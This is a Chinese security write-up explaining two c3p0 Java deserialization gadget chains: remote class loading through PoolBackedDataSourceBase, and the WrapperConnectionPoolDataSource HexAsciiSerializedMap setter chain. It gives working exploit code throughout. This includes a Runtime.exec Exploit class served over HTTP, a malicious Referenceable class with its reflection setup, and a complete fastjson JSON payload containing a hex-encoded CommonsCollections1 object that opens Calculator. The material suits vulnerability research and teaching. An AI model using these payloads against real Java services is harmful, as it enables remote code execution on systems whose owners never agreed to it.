# C3P0

这个链还是比较简单的，调用过程很短。

需要先了解URLClassLoader，简单写个demo看下：
```java
import java.net.URL;
import java.net.URLClassLoader;

public class urlClassloader {
    public static void main(String[] args) throws Exception{
        URL url = new URL("http://127.0.0.1:8080/");
        ClassLoader urlclassloader = new URLClassLoader(new URL[]{url}, Thread.currentThread().getContextClassLoader());

        Class exploit = Class.forName("Exploit", true, urlclassloader);  // 通过URLClassLoader获取类，并实例化
        Object exp = exploit.newInstance();
    }
}
```
我们可以写一个Exploit利用类：
```java
import java.io.IOException;

public class Exploit {
    public Exploit() throws IOException{
        Runtime.getRuntime().exec("open /Applications/Calculator.app");
    }
}
```
然后javac编译，并启动python http服务：
```sh
javac Exploit.java

python3 -m http.server
```
然后运行上面的urlClassloader类的main方法，即可弹计算器。

---

先了解下，connectionPoolDataSource是PoolBackedDataSourceBase类的一个私有属性
```java
private ConnectionPoolDataSource connectionPoolDataSource;
```

看下PoolBackedDataSourceBase的writeObject方法：
```java
private void writeObject(ObjectOutputStream oos) throws IOException {
    oos.writeShort(1); // 设置version

    ReferenceIndirector indirector;
    try { //尝试写序列化this.connectionPoolDataSource
        SerializableUtils.toByteArray(this.connectionPoolDataSource);
        oos.writeObject(this.connectionPoolDataSource);
    } catch (NotSerializableException var9) { // 如果失败，进来
        MLog.getLogger(this.getClass()).log(MLevel.FINE, "Direct serialization provoked a NotSerializableException! Trying indirect.", var9);

        try {  // 用ReferenceIndirector.indirectorForm来处理this.connectionPoolDataSource，再写序列化
            indirector = new ReferenceIndirector();
            oos.writeObject(indirector.indirectForm(this.connectionPoolDataSource));
        } catch (IOException var7) {
            throw var7;
        } catch (Exception var8) {
            throw new IOException("Problem indirectly serializing connectionPoolDataSource: " + var8.toString());
        }
    }
    .....
}
```
我们跟进ReferenceIndirector.indirectorForm：
```java
public IndirectlySerialized indirectForm(Object var1) throws Exception {
    Reference var2 = ((Referenceable)var1).getReference();  // 强制类型转换，调用其getRerference方法
    return new ReferenceSerialized(var2, this.name, this.contextName, this.environmentProperties);  // 实例化一个ReferenceSerialized
}
```
跟进ReferenceSerialized：
```java
private static class ReferenceSerialized implements IndirectlySerialized {
    Reference reference;
    Name name;
    Name contextName;
    Hashtable env;

    ReferenceSerialized(Reference var1, Name var2, Name var3, Hashtable var4) {
        this.reference = var1;
        this.name = var2;
        this.contextName = var3;
        this.env = var4;
    }
    ....
}
```
看到这里，我们可以注意到，如果我们写一个类实现了Referenceable接口，然后重写getRerence方法，再用这个类实例作为connectionPoolDataSource，在序列化时，ReferenceSerialized的this.reference就是受我们控制的。

---

接下来看PoolBackedDataSourceBase的readObject方法：
```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    short version = ois.readShort();
    switch (version) {
        case 1:
            Object o = ois.readObject();
            if (o instanceof IndirectlySerialized) {  // 判断类型，如果是IndirectlySerialized的实例，则调用其getObject方法
                o = ((IndirectlySerialized)o).getObject();
            }
        ...
    }
}
```
由于IndirectlySerialized是个接口，只有一个实现类ReferenceSerialized（上面已经讨论过他的实例化了），跟进：
```java
private static class ReferenceSerialized implements IndirectlySerialized {
    Reference reference;  // 这是我们可控的
    Name name;
    Name contextName;
    Hashtable env;

    ReferenceSerialized(Reference var1, Name var2, Name var3, Hashtable var4) {
        this.reference = var1;
        this.name = var2;
        this.contextName = var3;
        this.env = var4;
    }

    public Object getObject() throws ClassNotFoundException, IOException {
        try {
            InitialContext var1;
            if (this.env == null) {
                var1 = new InitialContext();
            } else {
                var1 = new InitialContext(this.env);
            }

            Context var2 = null;
            if (this.contextName != null) {
                var2 = (Context)var1.lookup(this.contextName);  // this.contextName不可控，因此无法造成jndi注入
            }

            return ReferenceableUtils.referenceToObject(this.reference, this.name, var2, this.env); // 跟进
        } catch (NamingException var3) {
            if (ReferenceIndirector.logger.isLoggable(MLevel.WARNING)) {
                ReferenceIndirector.logger.log(MLevel.WARNING, "Failed to acquire the Context necessary to lookup an Object.", var3);
            }

            throw new InvalidObjectException("Failed to acquire the Context necessary to lookup an Object: " + var3.toString());
        }
    }
}
```
跟进ReferenceableUtils.referenceToObject：
```java
public static Object referenceToObject(Reference var0, Name var1, Context var2, Hashtable var3) throws NamingException {
    try {
        String var4 = var0.getFactoryClassName();
        String var11 = var0.getFactoryClassLocation();  // var0可控，从var0获取类型以及路径
        ClassLoader var6 = Thread.currentThread().getContextClassLoader();
        if (var6 == null) {
            var6 = ReferenceableUtils.class.getClassLoader();
        }

        Object var7;
        if (var11 == null) {
            var7 = var6;
        } else {
            URL var8 = new URL(var11);
            var7 = new URLClassLoader(new URL[]{var8}, var6);
        }

        Class var12 = Class.forName(var4, true, (ClassLoader)var7);  // 通过URLClassLoader获取类，并实例化
        ObjectFactory var9 = (ObjectFactory)var12.newInstance();
        return var9.getObjectInstance(var0, var1, var2, var3);  // 试图调用Factory的getObjectInstance
    }
    ...
}
```

考虑到connectionPoolDataSource是ConnectionPoolDataSource类型，因此我们需要实现一个类，同时实现ConnectionPoolDataSource与Referenceable两个接口：
```java
public class CPDS implements ConnectionPoolDataSource, Referenceable {

    @Override
    public Reference getReference() throws NamingException {
        return new Reference("Exploit", "Exploit", "http://127.0.0.1:8000/");
    }

    @Override
    public PooledConnection getPooledConnection() throws SQLException {
        return null;
    }

    @Override
    public PooledConnection getPooledConnection(String user, String password) throws SQLException {
        return null;
    }

    @Override
    public PrintWriter getLogWriter() throws SQLException {
        return null;
    }

    @Override
    public void setLogWriter(PrintWriter out) throws SQLException {

    }

    @Override
    public void setLoginTimeout(int seconds) throws SQLException {

    }

    @Override
    public int getLoginTimeout() throws SQLException {
        return 0;
    }

    @Override
    public Logger getParentLogger() throws SQLFeatureNotSupportedException {
        return null;
    }
}
```
大部分方法都是实现接口必须写的，只有getReference我们需要重写，设定classname、factory、factoryLocation。

然后new一个PoolBackedDataSourceBase实例，通过反射修改其connectionPoolDataSource。
```java
PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
Field connectionPoolDataSource = poolBackedDataSourceBase.getClass().getDeclaredField("connectionPoolDataSource");
connectionPoolDataSource.setAccessible(true);
connectionPoolDataSource.set(poolBackedDataSourceBase,new CPDS());
```
到这里就构造好了。
在序列化时，其调用链为：
```java
PoolBackedDataSourceBase.writeObject()
    -> ReferenceIndirector.indirectForm(this.connectionPoolDataSource) -> CPDS.getReference() // 这是我们改的方法
    -> new ReferenceSerialized() -> 设置this.reference
```

反序列化时的调用链：
```java
ObjectInputStream.readObject() 
    -> com.mchange.v3.c3p0.impl.PoolBackedDataSourceBase.readObject()
    -> IndirectlySerialized.getObject() -> com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized.getObject()
        -> ReferenceAbleUtils.referenceToObject() -> Class.forName(xxxclass) && xxxclass.newInstance()
```

# HexBase WrapperConnectionPoolDataSourceBase

这个链同在组件c3p0中，所以合在一起说。他的特点是可以直接加在hex字节码进行利用，适合目标不出网场景，而且由于他的核心在于其setter方法的调用，因此可以应用于fastjson等漏洞场景。

先来看下userOverridesAsString。
```java
private String userOverridesAsString = C3P0Config.initializeUserOverridesAsString();
```
他的setter方法如下：
```java
public synchronized void setUserOverridesAsString(String userOverridesAsString) throws PropertyVetoException {
    String oldVal = this.userOverridesAsString;
    if (!this.eqOrBothNull(oldVal, userOverridesAsString)) {
        this.vcs.fireVetoableChange("userOverridesAsString", oldVal, userOverridesAsString);
    }

    this.userOverridesAsString = userOverridesAsString;
}
```
this.vcs.fireVetoableChange最终会调用C3P0ImplUtils.parseUserOverridesAsString
```java
public static Map parseUserOverridesAsString(String userOverridesAsString) throws IOException, ClassNotFoundException {
    if (userOverridesAsString != null) {
        String hexAscii = userOverridesAsString.substring("HexAsciiSerializedMap".length() + 1, userOverridesAsString.length() - 1); // 对字符串进行分割
        byte[] serBytes = ByteUtils.fromHexAscii(hexAscii); // hex转byte数组
        return Collections.unmodifiableMap((Map)SerializableUtils.fromByteArray(serBytes));  // 跟进
    } else {
        return Collections.EMPTY_MAP;
    }
}
```
SerializableUtils.fromByteArray如下：
```java
public static Object fromByteArray(byte[] var0) throws IOException, ClassNotFoundException {
    Object var1 = deserializeFromByteArray(var0);
    return var1 instanceof IndirectlySerialized ? ((IndirectlySerialized)var1).getObject() : var1;
}
```
跟进deserializeFromByteArray：
```java
public static Object deserializeFromByteArray(byte[] var0) throws IOException, ClassNotFoundException {
    ObjectInputStream var1 = new ObjectInputStream(new ByteArrayInputStream(var0));
    return var1.readObject();
}
```
直接对bytearray进行readObject，这意味着我们可以用ysoserial随便生成一个poc，然后将其转byte再转hex，然后将字符串`"HexAsciiSerializedMap"`与其拼接，就是一个可以反序列化的漏洞利用了。

具体代码见HexBase.java。需要注意的是，你用哪个链生成的poc，需要在本地添加相应的maven配置。

---

应用到fastjson中，poc如下：
```json
{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","UserOverridesAsString":"HexAsciiSerializedMap:ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737D00000001000D6A6176612E7574696C2E4D6170787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707371007E00007372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001E00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001E7371007E00167571007E001B00000002707571007E001B00000000740006696E766F6B657571007E001E00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E001B7371007E0016757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017400216F70656E202F4170706C69636174696F6E732F43616C63756C61746F722E617070740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000000770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003Ap"}
```
我用的是CC1链，命令为：`open /Applications/Calculator.app`

具体代码见于FastjsonWithC3P0Hex.java，`JSON.parse`和`JSON.parseObject`都可用，因为他们都会调用setter方法。